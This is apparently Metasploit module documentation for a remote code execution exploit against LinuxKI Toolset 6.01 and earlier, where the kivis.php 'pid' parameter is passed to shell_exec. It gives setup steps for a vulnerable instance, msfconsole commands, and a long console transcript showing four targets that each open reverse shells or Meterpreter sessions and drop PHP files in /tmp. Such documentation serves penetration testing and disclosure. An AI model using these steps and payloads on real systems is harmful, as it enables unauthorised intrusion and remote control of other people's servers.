## Vulnerable Application
LinuxKI Toolset <= 6.01

This module exploits a vulnerability in LinuxKI Toolset <= 6.01 which allows remote code execution.
The `kivis.php` `pid` parameter received from the user is sent to the `shell_exec` function, resulting in security vulnerability.

To test this application, you need to download the version 6.01 [here](https://github.com/HewlettPackard/LinuxKI/blob/v6.0-1/Dockerfile).
Do not forget to change [this URL](https://raw.githubusercontent.com/HewlettPackard/LinuxKI/master/rpms/linuxki-6.0-1.noarch.rpm) inside
the Dockerfile with [this one](https://github.com/HewlettPackard/LinuxKI/raw/v6.0-1/rpms/linuxki-6.0-1.noarch.rpm).

## Verification Steps
1. Install the application
2. Start msfconsole
3. Do: ```use exploit/linux/http/linuxki_rce```
4. Do: ```show TARGETS```
5. Do: ```set TARGET #```
6. Do: ```set RHOSTS```
7. Do: ```set LHOST```
8. Do: ```run```
9. You should get a shell.

## Options
### WritableDir

A writable directory file system path. (default: `/tmp`)

### ForceExploit

Override check result.

## Scenarios
### LinuxKI Toolset v6.01 on CentOS 7.8
```
msf5 > use exploit/linux/http/linuxki_rce
msf5 exploit(linux/http/linuxki_rce) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)
   1   Automatic (PHP Dropper)
   2   Automatic (Unix In-Memory)
   3   Automatic (Linux Dropper)


msf5 exploit(linux/http/linuxki_rce) > set rhosts 192.168.1.43
rhosts => 192.168.1.43
msf5 exploit(linux/http/linuxki_rce) > set rport 32769
rport => 32769
msf5 exploit(linux/http/linuxki_rce) > run

[*] Started reverse TCP handler on 192.168.1.43:4444
[*] Executing Automatic (PHP In-Memory) target
[*] Sending payload...
[*] Sending stage (38288 bytes) to 192.168.1.43
[*] Meterpreter session 1 opened (192.168.1.43:4444 -> 192.168.1.43:53126) at 2020-06-07 20:27:10 +0300

meterpreter > sysinfo
Computer    : 36503ef4f463
OS          : Linux 36503ef4f463 4.19.76-linuxkit #1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.1.43 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(linux/http/linuxki_rce) > set target 1
target => 1
msf5 exploit(linux/http/linuxki_rce) > unset payload
Unsetting payload...
msf5 exploit(linux/http/linuxki_rce) > run

[*] Started reverse TCP handler on 192.168.1.43:4444
[*] Executing Automatic (PHP Dropper) target
[*] Sending payload...
[*] Sending stage (38288 bytes) to 192.168.1.43
[*] Meterpreter session 2 opened (192.168.1.43:4444 -> 192.168.1.43:53133) at 2020-06-07 20:27:52 +0300
[!] This exploit may require manual cleanup of '/tmp/kB4gJoH4xozwDdUva6tjqt.php' on the target

meterpreter > sysinfo
Computer    : 36503ef4f463
OS          : Linux 36503ef4f463 4.19.76-linuxkit #1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.1.43 - Meterpreter session 2 closed.  Reason: User exit
msf5 exploit(linux/http/linuxki_rce) > set target 2
target => 2
msf5 exploit(linux/http/linuxki_rce) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf5 exploit(linux/http/linuxki_rce) > run

[*] Started reverse TCP handler on 192.168.1.43:4444
[*] Executing Automatic (Unix In-Memory) target
[*] Sending payload...
[*] Command shell session 3 opened (192.168.1.43:4444 -> 192.168.1.43:53141) at 2020-06-07 20:29:56 +0300

uname -a
Linux 36503ef4f463 4.19.76-linuxkit #1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
exit
[*] 192.168.1.43 - Command shell session 3 closed.
msf5 exploit(linux/http/linuxki_rce) > set target 3
target => 3
msf5 exploit(linux/http/linuxki_rce) > unset payload
Unsetting payload...
msf5 exploit(linux/http/linuxki_rce) > run

[*] Started reverse TCP handler on 192.168.1.43:4444
[*] Executing Automatic (Linux Dropper) target
[*] Sending payload...
[*] Sending stage (980808 bytes) to 192.168.1.43
[*] Meterpreter session 4 opened (192.168.1.43:4444 -> 192.168.1.43:53146) at 2020-06-07 20:31:23 +0300
[!] This exploit may require manual cleanup of '/tmp/ag6G4ssIKEpH3lDyL.php' on the target

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : CentOS 7.8.2003 (Linux 4.19.76-linuxkit)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 172.17.0.2 - Meterpreter session 4 closed.  Reason: User exit
msf5 exploit(linux/http/linuxki_rce) >
```
